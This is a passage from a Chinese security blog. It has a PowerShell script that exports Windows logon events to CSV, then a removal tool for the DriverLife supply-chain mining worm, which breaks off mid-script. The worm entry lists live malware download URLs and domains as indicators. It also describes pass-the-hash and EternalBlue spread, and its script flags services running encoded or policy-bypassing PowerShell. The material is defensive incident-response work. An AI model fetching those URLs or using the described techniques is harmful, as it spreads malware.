class="variable">$LogonType</span>[<span class="variable">$_</span>.Properties[<span class="number">10</span>].Value]</span><br><span class="line">            SourceIP = <span class="variable">$_</span>.Properties[<span class="number">19</span>].Value</span><br><span class="line">            Keywords = <span class="variable">$_</span>.KeywordsDisplayNames -join <span class="string">";"</span></span><br><span class="line">        &#125;)&#125;|<span class="built_in">Export-Csv</span> -Path <span class="variable">$hostname</span><span class="string">"_fail_login.csv"</span> -NoTypeInformation -UseCulture  -Encoding Default</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$events_success</span> |<span class="built_in">ForEach-Object</span> &#123; <span class="built_in">New-Object</span> PSObject -Property ([ordered]@&#123;</span><br><span class="line">            MachineName = (<span class="variable">$_</span>.MachineName).Split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line">            TimeCreated = <span class="variable">$_</span>.TimeCreated</span><br><span class="line">            User = <span class="variable">$_</span>.Properties[<span class="number">5</span>].Value</span><br><span class="line">            Domain = <span class="variable">$_</span>.Properties[<span class="number">6</span>].Value</span><br><span class="line">            LogonType = <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value</span><br><span class="line">            LogonTypeString = <span class="variable">$LogonType</span>[<span class="variable">$_</span>.Properties[<span class="number">8</span>].Value]</span><br><span class="line">            SourceIP = <span class="variable">$_</span>.Properties[<span class="number">18</span>].Value</span><br><span class="line">            Keywords = <span class="variable">$_</span>.KeywordsDisplayNames -join <span class="string">";"</span></span><br><span class="line">        &#125;)&#125; | <span class="built_in">Export-Csv</span> -Path <span class="variable">$hostname</span><span class="string">"_success_login.csv"</span> -NoTypeInformation -UseCulture -Encoding Default</span><br></pre></td></tr></table></figure><p><strong>效果如下：</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/c8584938b22eec1dd3f86528b1d630af.png" alt="2019-07-19-04-53-03"></p><h2 id="使用WEVTUtil-powershell-将外部日志导出csv（最终版）"><a href="#使用WEVTUtil-powershell-将外部日志导出csv（最终版）" class="headerlink" title="使用WEVTUtil+powershell 将外部日志导出csv（最终版）"></a>使用WEVTUtil+powershell 将外部日志导出csv（最终版）</h2><blockquote><p>此种方法优点就是快，支持导入外部evtx，对于几百兆巨大日志丝毫不费力</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Param</span> (</span><br><span class="line">    [string]<span class="variable">$evtx</span> = <span class="variable">$pwd</span>.Path+<span class="string">"\*_Security.evtx"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable">$time</span>=<span class="built_in">Get-Date</span> -Format h:mm:ss</span><br><span class="line"><span class="variable">$evtx</span>=(<span class="built_in">Get-Item</span> <span class="variable">$evtx</span>).fullname</span><br><span class="line"><span class="variable">$outfile</span>=(<span class="built_in">Get-Item</span> <span class="variable">$evtx</span>).BaseName+<span class="string">".csv"</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$logsize</span>=[int]((<span class="built_in">Get-Item</span> <span class="variable">$evtx</span>).length/<span class="number">1</span>MB)</span><br><span class="line"></span><br><span class="line"><span class="built_in">write-host</span> [+] <span class="variable">$time</span> Load <span class="variable">$evtx</span> <span class="string">"("</span>Size: <span class="variable">$logsize</span> MB<span class="string">")"</span> ... -ForegroundColor Green</span><br><span class="line">[xml]<span class="variable">$xmldoc</span>=WEVTUtil qe  <span class="variable">$evtx</span> /q:<span class="string">"*[System[Provider[@Name='Microsoft-Windows-Security-Auditing']  and (EventID=4624 or EventID=4625)] and EventData[Data[@Name='LogonType']='3'] or EventData[Data[@Name='LogonType']='10']]"</span> /e:root /f:Xml  /lf</span><br><span class="line"></span><br><span class="line"><span class="variable">$xmlEvent</span>=<span class="variable">$xmldoc</span>.root.Event</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> OneEventToDict &#123;</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        <span class="variable">$event</span></span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$ret</span> = @&#123;</span><br><span class="line">        <span class="string">"SystemTime"</span> = <span class="variable">$event</span>.System.TimeCreated.SystemTime | Convert-DateTimeFormat -OutputFormat <span class="string">'yyyy"/"MM"/"dd HH:mm:ss'</span>;</span><br><span class="line">        <span class="string">"EventID"</span> = <span class="variable">$event</span>.System.EventID</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span>=<span class="variable">$event</span>.EventData.Data</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$data</span>.Count; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$ret</span>.Add(<span class="variable">$data</span>[<span class="variable">$i</span>].name, <span class="variable">$data</span>[<span class="variable">$i</span>].<span class="string">'#text'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">filter</span> Convert-DateTimeFormat</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">Param</span>(<span class="variable">$OutputFormat</span>=<span class="string">'yyyy-MM-dd HH:mm:ss fff'</span>)</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    ([DateTime]<span class="variable">$_</span>).ToString(<span class="variable">$OutputFormat</span>)</span><br><span class="line">  &#125; catch &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$time</span>=<span class="built_in">Get-Date</span> -Format h:mm:ss</span><br><span class="line"><span class="built_in">write-host</span> [+] <span class="variable">$time</span> Extract XML ... -ForegroundColor Green</span><br><span class="line">[System.Collections.ArrayList]<span class="variable">$results</span> = <span class="built_in">New-Object</span> System.Collections.ArrayList(<span class="literal">$null</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$xmlEvent</span>.Count; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$event</span> = <span class="variable">$xmlEvent</span>[<span class="variable">$i</span>]</span><br><span class="line">    <span class="variable">$datas</span> = OneEventToDict <span class="variable">$event</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$results</span>.Add((<span class="built_in">New-Object</span> PSObject -Property <span class="variable">$datas</span>))|<span class="built_in">out-null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$time</span>=<span class="built_in">Get-Date</span> -Format h:mm:ss</span><br><span class="line"><span class="built_in">write-host</span> [+] <span class="variable">$time</span> Dump into CSV: <span class="variable">$outfile</span> ... -ForegroundColor Green</span><br><span class="line"><span class="variable">$results</span> | <span class="built_in">Select-Object</span> SystemTime,IpAddress,TargetDomainName,TargetUserName,EventID,LogonType | <span class="built_in">Export-Csv</span> <span class="variable">$outfile</span> -NoTypeInformation -UseCulture  -Encoding Default -Force</span><br></pre></td></tr></table></figure><p>最终根据excel处理<br><strong>效果如下：</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/cebf28fffd121868e2b0b9b688cdc2a9.png" alt="2019-07-19-04-57-06"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/76632fe9dcbdffb78a9786506386a109.png" alt="2019-07-19-04-57-25"></p><p><strong>附录</strong><br><a href="https://xz.aliyun.com/t/2524" target="_blank" rel="noopener">windows日志分析</a><br><a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/" target="_blank" rel="noopener">恶意日志分析</a><br><a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor" target="_blank" rel="noopener">windows日志</a><br><a href="https://gist.github.com/exp0se/1bae653b790cf5571d20" target="_blank" rel="noopener">logparser tips</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>驱动人生供应链攻击挖矿专杀工具 Demo版</title>
      <link href="/2019/03/15/DriverLife-Worm-killer/"/>
      <url>/2019/03/15/DriverLife-Worm-killer/</url>
      
        <content type="html"><![CDATA[<p><strong>病毒描述：</strong></p><blockquote><p>360安全大脑监测到通过”驱动人生”供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。<br>pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。<br>永恒之蓝下载器木马再次更新，此前攻击者针对驱动人生公司的供应链进行攻击，利用其软件升级通道下发永恒之蓝下载器木马，并利用其软件升级通道下发木马，在攻击模块中利用“永恒之蓝”漏洞攻击，造成短时间内大范围感染。事件发生之后，驱动人生公司对受到木马影响的升级通道进行了紧急关闭。</p></blockquote><blockquote><p>但该木马下载器的幕后控制者并没有就此放弃行动，而是借助其已经感染的机器进行持续攻击：包括通过云控指令下发挖矿模块，在中招机器安装多个服务以及通过添加计划任务获得持续执行的机会，后续版本在攻击模块新增SMB爆破、远程执行工具psexec攻击、利用Powershell版mimikatz获取密码，以增强其扩散传播能力。<br>2019年2月10日发现的更新版本中，我们发现攻击者再次对攻击模块进行升级，改变其木马生成方式为Pyinstaller，同时在打包的Python代码中新增了email、cookie、ftp、http相关功能文件。木马通过将程序安装至系统服务、计划任务从而可以开机启动同时每隔一段时间重复启动，获得在感染电脑持续驻留的机会。</p></blockquote><p><strong>控制维持方式：</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/34aade5eee3e83d639ed4b2b78b03767.png" alt="2019-07-20-03-25-51"></p><p><strong>查杀脚本功能</strong></p><ol><li>删除恶意进程、服务、计划任务、注册表项、恶意文件</li><li>删除无规则随机字符串服务</li><li>支持最老版本样本，及最新样本</li><li>由于该攻击样本不停变形增肥md5值一直在便，故采用md5黑名单+恶意证书方式来清理</li><li>由于该系列病毒不断变种，本脚本不保证有效清除，仅作为技术交流使用</li></ol><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/b60dec0b75dae9bec03a0ba5109990b5.png" alt="2019-07-20-03-22-43"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/6dda05ea259444eec49c10a56849633e.png" alt="2019-07-20-03-23-45"></p><p><strong>恶意证书:</strong><br>驱动人生病毒所涉及的签名证书：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN</span><br><span class="line"></span><br><span class="line">CN=&quot;Shenzhen Qitu Software Technolgy Co., Ltd.&quot;, OU=Digital ID Class 3 - Microsoft Software Validation v2, O=&quot;Shenzhen Qitu Software Technolgy Co., Ltd.&quot;, L=Shenzhen, S=Guangdong, C=CN</span><br><span class="line"></span><br><span class="line">CN=Shenzhen Le Zhuo Software Technologies Ltd., OU=Digital ID Class 3 - Microsoft Software Validation v2, O=Shenzhen Le Zhuo Software Technologies Ltd., L=Shenzhen, S=Guangdong, C=CN</span><br></pre></td></tr></table></figure><p>根据证书判断恶意进程服务案例：<br><a href="http://wolvez.club/2019/02/12/threathunter-windows/">http://wolvez.club/2019/02/12/threathunter-windows/</a></p><p><strong>域名ioc</strong></p><blockquote><p>防火墙配置阻止以下域名访问</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://r.minicen.ga/r</span><br><span class="line">http://v.beahh.com/v</span><br><span class="line">http://139.162.107.97/new.dat</span><br><span class="line">http://p.beahh.com/upgrade.php</span><br><span class="line">http://cert.beahh.com</span><br><span class="line">i.haqo.net</span><br><span class="line">dl.haqo.net</span><br><span class="line">abbny.com</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Write-Host</span> <span class="string">'# cowsay++'</span> </span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">'    _________________'</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">'&lt; DriverLife Worm killer v0.2&gt;'</span> </span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">'   -----------------------'</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">'    \   ,__,'</span> -ForegroundColor Red</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">'     \  (oo)____'</span> -ForegroundColor Red</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">'        (__)    )\'</span> -ForegroundColor Red</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">'           ||--|| *'</span> -ForegroundColor Red</span><br><span class="line"><span class="built_in">Write-Host</span> </span><br><span class="line"><span class="built_in">write-host</span> 奇安信安服应急小组出品</span><br><span class="line"><span class="keyword">If</span> (<span class="nomarkup">-NOT</span> ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] <span class="string">"Administrator"</span>))</span><br><span class="line"> &#123;    </span><br><span class="line">  <span class="built_in">Write-Host</span> <span class="string">"[x] This script needs to be run As Admin"</span> -ForegroundColor Red</span><br><span class="line">  <span class="keyword">Break</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">Write-Host</span> </span><br><span class="line"><span class="variable">$evilHashes</span>=@()</span><br><span class="line"><span class="variable">$evilHashes</span> = <span class="string">"6983F7001DE10F4D19FC2D794C3EB534"</span>,</span><br><span class="line"><span class="string">"8B73928229C19A8F535DE8F2EB2ADC70"</span>,</span><br><span class="line"><span class="string">"59B18D6146A2AA066F661599C496090D"</span>,</span><br><span class="line"><span class="string">"DEF0E980D7C2A59B52D0C644A6E40763"</span>,</span><br><span class="line"><span class="string">"23196DE0EDE25FB9659713FA6799F455"</span>,</span><br><span class="line"><span class="string">"CE924B12FFC55021F5C1BCF308F29704"</span>,</span><br><span class="line"><span class="string">"2FBCE2ECF670EB186C6E3E5886056312"</span>,</span><br><span class="line"><span class="string">"30429A24F312153C0EC271CA3FEABF3D"</span>,</span><br><span class="line"><span class="string">"F9144118127FF29D4A49A30B242CEB55"</span>,</span><br><span class="line"><span class="string">"FB89D40E24F5FF55228C38B2B07B2E77"</span>,</span><br><span class="line"><span class="string">"1E0DB9FDBC57525A2A5F5B4C69FAC3BB"</span>,</span><br><span class="line"><span class="string">"5AB6F8CA1F22D88B8EF9A4E39FCA0C03"</span>,</span><br><span class="line"><span class="string">"D4E2EBCF92CF1B2E759FF7CE1F5688CA"</span>,</span><br><span class="line"><span class="string">"32653B2C277F18779C568A1E45CACC0F"</span>,</span><br><span class="line"><span class="string">"AB1C947C0C707C0E0486D25D0AE58148"</span>,</span><br><span class="line"><span class="string">"A4B7940B3D6B03269194F728610784D6"</span>,</span><br><span class="line"><span class="string">"85013CC5D7A6DB3BCEE3F6B787BAF957"</span>,</span><br><span class="line"><span class="string">"667A3848B411AF0B6C944D47B559150F"</span>,</span><br><span class="line"><span class="string">"8B1AC2F487E9B0A56FBE0A07F0E1F6F4"</span>,</span><br><span class="line"><span class="string">"CCE36235A525858EB55070847296C4C8"</span>,</span><br><span class="line"><span class="string">"9911858E9BEC100CCF6D8134915103EC"</span>,</span><br><span class="line"><span class="string">"74E2A43B2B7C6E258B3A3FC2516C1235"</span>,</span><br><span class="line"><span class="string">"637BF46077AD083659D3B96A010F38FE"</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$checkPath</span> = @(<span class="string">"<span class="variable">$env:SystemRoot</span>\"</span>, <span class="string">"<span class="variable">$env:LOCALAPPDATA</span>\"</span>, <span class="string">"<span class="variable">$env:ALLUSERSPROFILE</span>\"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> _calc_md5&#123;</span><br><span class="line">    <span class="keyword">Param</span>(<span class="variable">$path</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$path</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Test-Path</span> <span class="variable">$path</span> -PathType Leaf )&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="variable">$fs</span>=(<span class="built_in">new-object</span> system.io.fileinfo(<span class="variable">$path</span>)).openread();</span><br><span class="line">                <span class="variable">$r</span>=(<span class="built_in">new-object</span> system.security.cryptography.md5cryptoserviceprovider).computehash(<span class="variable">$fs</span>);<span class="variable">$fs</span>.close();</span><br><span class="line">                [string]<span class="variable">$hash</span>=[bitconverter]::tostring(<span class="variable">$r</span>).replace(<span class="string">'-'</span>,<span class="string">''</span>)   </span><br><span class="line">            &#125;catch&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$retVal</span> = <span class="built_in">New-Object</span> -TypeName psobject -Property @&#123;</span><br><span class="line">                Path = <span class="variable">$path</span></span><br><span class="line">                Hash = <span class="variable">$hash</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$retVal</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">write-host</span> [-] <span class="string">'_calc_md5'</span> <span class="variable">$path</span> -ForegroundColor Yellow</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> _del_if_match &#123;</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        <span class="variable">$path</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="variable">$md5info</span> = _calc_md5 <span class="variable">$path</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">$null</span> <span class="nomarkup">-ne</span> <span class="variable">$md5info</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$evilHashes</span> <span class="nomarkup">-eq</span> <span class="variable">$md5info</span>.Hash) &#123;</span><br><span class="line">            <span class="built_in">write-host</span> [-] <span class="string">'deleting'</span> <span class="variable">$path</span> -ForegroundColor Red</span><br><span class="line">            <span class="built_in">Remove-Item</span> -Path <span class="variable">$path</span> -Force</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> Check-And-Delete &#123;</span><br><span class="line">    <span class="keyword">Param</span>(</span><br><span class="line">        <span class="variable">$path</span>,</span><br><span class="line">        [switch]<span class="variable">$recurse</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="variable">$params</span> = @&#123;</span><br><span class="line">        <span class="keyword">Filter</span> = <span class="string">'*.exe'</span></span><br><span class="line">        Force = <span class="literal">$true</span></span><br><span class="line">        ErrorAction = <span class="number">0</span></span><br><span class="line">        Path = <span class="variable">$path</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$recurse</span> <span class="nomarkup">-ne</span> <span class="literal">$False</span>) &#123;</span><br><span class="line">        <span class="variable">$params</span>.Add(<span class="string">'recurse'</span>, <span class="literal">$True</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">write-host</span> [i] <span class="string">'Check-And-Delete'</span> <span class="variable">$path</span> -ForegroundColor Green</span><br><span class="line">    <span class="built_in">Get-ChildItem</span> @params | %&#123;_del_if_match <span class="variable">$_</span>.FullName&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete by hashes</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$path</span> <span class="keyword">in</span> <span class="variable">$checkPath</span>) &#123;</span><br><span class="line">    Check-And-Delete <span class="variable">$path</span> -recurse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Check-And-Delete <span class="string">"<span class="variable">$env:HOMEDRIVE</span>\"</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete by size</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$path</span> <span class="keyword">in</span> @(<span class="string">"<span class="variable">$env:APPDATA</span>\Microsoft\cred.ps1"</span>, <span class="string">"<span class="variable">$env:ALLUSERSPROFILE</span>\Microsoft\cred.ps1"</span>)) &#123;</span><br><span class="line">    <span class="variable">$size</span> = (<span class="built_in">Get-Item</span> <span class="variable">$path</span> -ErrorAction SilentlyContinue).Length</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$size</span> <span class="nomarkup">-eq</span> <span class="number">50731</span>) &#123;</span><br><span class="line">        <span class="built_in">write-host</span> [-] <span class="string">'deleting'</span> <span class="variable">$path</span> -ForegroundColor Red</span><br><span class="line">        <span class="built_in">Remove-Item</span> <span class="variable">$path</span> -Force</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">write-host</span> [i] <span class="string">'Check-And-Delete'</span> services -ForegroundColor Green</span><br><span class="line"><span class="variable">$servicesPath</span> = @&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$service</span> <span class="keyword">in</span> (<span class="built_in">Get-WmiObject</span> win32_service)) &#123;</span><br><span class="line">    [String]<span class="variable">$name</span> = <span class="variable">$service</span>.pathname</span><br><span class="line">    <span class="variable">$exePath</span> = <span class="variable">$name</span>.Split()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$name</span>.StartsWith(<span class="string">'"'</span>)) &#123;</span><br><span class="line">        <span class="variable">$exePath</span> = <span class="variable">$name</span>.Split(<span class="string">'"'</span>)[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if powershell</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$name</span>.ToLower().IndexOf(<span class="string">"powershell.exe "</span>) <span class="nomarkup">-gt</span> <span class="number">0</span> -and <span class="variable">$name</span>.ToLower().IndexOf(<span class="string">" -enc"</span>) <span class="nomarkup">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">write-host</span> [-] <span class="string">'deleting service'</span> <span class="variable">$path</span> -ForegroundColor Red</span><br><span class="line">        <span class="built_in">Stop-Service</span> -Force -Name <span class="variable">$service</span>.Name -ErrorAction SilentlyContinue</span><br><span class="line">        sc.exe delete <span class="variable">$service</span>.Name</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$name</span>.ToLower().IndexOf(<span class="string">"powershell"</span>) <span class="nomarkup">-gt</span> <span class="number">0</span> -and <span class="variable">$name</span>.ToLower().IndexOf(<span class="string">"bypass"</span>) <span class="nomarkup">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">write-host</span> [-] <span class="string">'deleting service'</span> <span class="variable">$path</span> -ForegroundColor Red</span><br><span class="line">        <span class="built_in">Stop-Service</span> -Force -Name <span class="variable">$service</span>.Name -ErrorAction SilentlyContinue</span><br><span class="line">        sc.exe delete <span class="variable">$service</span>.Name</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$servicesPath</span>.ContainsKey(<span class="variable">$exePath</span>)) &#123; <span class="keyword">continue</span> &#125;</span><br><span class="line">    <span class="variable">$servicesPath</span>.Add(<span class="variable">$exePath</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable">$servicemd5</span> = _calc_md5 <span class="variable">$exePath</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">$null</span> 